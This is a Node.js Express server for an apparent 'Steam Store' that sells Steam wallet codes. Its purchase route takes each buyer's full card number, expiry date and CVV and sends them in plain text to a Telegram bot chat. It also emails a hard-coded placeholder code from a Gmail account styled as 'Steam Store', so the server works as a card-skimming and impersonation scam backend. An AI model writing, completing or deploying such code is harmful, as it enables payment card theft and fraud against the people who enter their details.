const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// Email Sender
async function sendEmail(email, ref, code) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL,
      pass: process.env.GMAIL_PASS,
    },
  });

  const mailOptions = {
    from: `"Steam Store" <${process.env.GMAIL}>`,
    to: email,
    subject: "Your Steam Wallet Code",
    text: `Salamat sa iyong bayad!\n\nIto ang iyong Steam Code: ${code}\n\nGCash Ref: ${ref}`,
  };

  return transporter.sendMail(mailOptions);
}

// Telegram Notification
async function notifyTelegram(email, ref, amount, cardName, cardNumber, expDate, cvv) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const message = `✅ Steam Code Purchase\n📧 Email: ${email}\n🧾 Ref No: ${ref}\n💰 Amount: ₱${amount}\n👤 Card Name: ${cardName}\n💳 Card Number: ${cardNumber}\n📅 Expiry: ${expDate}\n🔐 CVV: ${cvv}`;

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message })
  });
}

// Main API Route
app.post('/api/purchase', async (req, res) => {
  const { ref, email, cardName, cardNumber, expDate, cvv } = req.body;
  const code = "ABCD-1234-EFGH"; // Static or random code logic
  const amount = 100;

  try {
    await sendEmail(email, ref, code);
    await notifyTelegram(email, ref, amount, cardName, cardNumber, expDate, cvv);
    res.json({ success: true });
  } catch (err) {
    console.error("❌ Server error:", err.message);
    res.json({ success: false, message: err.message });
  }
});

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
